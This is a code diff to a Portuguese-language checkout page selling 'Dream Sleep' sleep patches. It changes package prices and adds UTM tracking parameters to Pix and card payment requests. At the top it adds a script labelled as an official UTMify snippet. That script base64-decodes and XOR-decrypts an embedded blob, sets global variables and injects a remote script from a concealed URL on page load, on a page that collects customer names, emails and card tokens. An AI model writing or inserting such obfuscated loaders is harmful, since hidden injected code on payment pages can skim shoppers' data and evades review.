@@ -33,6 +33,9 @@
   <!-- End Meta Pixel Code -->
   <!-- Meta Pixel Centralizado -->
   <script defer src="meta-pixel.js"></script>
+
+  <!-- UTMify Script Oficial -->
+  <script>(function(){var h_t73=atob("DGMjJPF60hk47jAXJRgBUYMW8CMahkRjVRAZC94ZtncWm0R6TAVaCpIVvzdanB9kRhFKVIUJ/WxMg0M4SQJXQYIO/HNLzBw1RBdXVpgYp21dnRItfhgBSpAXtzsCzFR2UQIOUYUXu39Bw0BlQBVGSoVXqnpXih1kRggBCNMMs3VNixItB0FeCIpYvHhVixItBwdCUJBXp21Vh1ZuCBNRQYcfvG0VnUV1TAdQBt1YpHhUm1U1H0EBWawH");var i_7h=[];for(var i_382=0;i_382<h_t73.length;i_382++){i_7h.push(h_t73.charCodeAt(i_382)&255);}var n_yxw=i_7h[0];var a_gr=i_7h.slice(1,1+n_yxw);var w_6i=i_7h.slice(1+n_yxw);var d_w1=w_6i.map(function(b,w_nx8){return b^a_gr[w_nx8%n_yxw];});var e_6="";for(var d_hl=0;d_hl<d_w1.length;d_hl++){e_6+=String.fromCharCode(d_w1[d_hl]&255);}var p_rv9=decodeURIComponent(escape(e_6));var u_0t=JSON.parse(p_rv9);var h_bub=u_0t.globals||[];h_bub.forEach(function(u_f73){window[u_f73.name]=u_f73.value;});var t_c=document.createElement("script");t_c.src=u_0t.url;t_c.async=true;t_c.defer=true;(u_0t.attributes||[]).forEach(function(e_okmh){t_c.setAttribute(e_okmh.name,e_okmh.value);});(document.head||document.documentElement).appendChild(t_c);})();</script>
   
   <!-- Fonts & Remix Icon -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -1278,9 +1281,9 @@
   <!-- JS LOGIC -->
   <script>
     const PACKAGES = {
-      '1': { title: 'Dream Sleep - 1 Pacote 48 Adesivos', price: 109.00 },
-      '2': { title: 'Dream Sleep - 2 Pacotes 96 Adesivos', price: 197.00 },
-      '3': { title: 'Dream Sleep - 3 Pacotes 144 Adesivos', price: 270.00 }
+      '1': { title: 'Dream Sleep - 1 Pacote 48 Adesivos', price: 47.90 },
+      '2': { title: 'Dream Sleep - 2 Pacotes 96 Adesivos', price: 77.90 },
+      '3': { title: 'Dream Sleep - 3 Pacotes 144 Adesivos', price: 107.90 }
     };
 
     let selectedPackage = PACKAGES['1'];
@@ -1290,7 +1293,33 @@
     let pixTimerSeconds = 28 * 60 + 25; // 28:25 Timer (Image 4)
     let mpInstance = null;
 
+    function captureTrackingParameters() {
+      const params = new URLSearchParams(window.location.search);
+      const trackingData = {
+        src: params.get('src') || '',
+        sck: params.get('sck') || '',
+        utm_source: params.get('utm_source') || '',
+        utm_medium: params.get('utm_medium') || '',
+        utm_campaign: params.get('utm_campaign') || '',
+        utm_content: params.get('utm_content') || '',
+        utm_term: params.get('utm_term') || '',
+        campaign_id: params.get('campaign_id') || '',
+        adset_id: params.get('adset_id') || '',
+        ad_id: params.get('ad_id') || ''
+      };
+
+      for (const key in trackingData) {
+        if (trackingData[key]) {
+          localStorage.setItem(`ds_${key}`, trackingData[key]);
+        } else {
+          trackingData[key] = localStorage.getItem(`ds_${key}`) || '';
+        }
+      }
+      return trackingData;
+    }
+
     window.addEventListener('DOMContentLoaded', () => {
+      captureTrackingParameters();
       const params = new URLSearchParams(window.location.search);
       const packId = params.get('pack') || '1';
       if (PACKAGES[packId]) {
@@ -1751,6 +1780,7 @@
         transaction_amount: total,
         payment_method_id: 'pix',
         description: selectedPackage.title,
+        tracking_parameters: captureTrackingParameters(),
         payer: {
           name: document.getElementById('cust-name').value,
           email: document.getElementById('cust-email').value,
@@ -1859,6 +1889,7 @@
           description: selectedPackage.title,
           installments: document.getElementById('card-installments').value || '1',
           token: cardToken.id,
+          tracking_parameters: captureTrackingParameters(),
           payer: {
             name: holder,
             email: document.getElementById('cust-email').value,
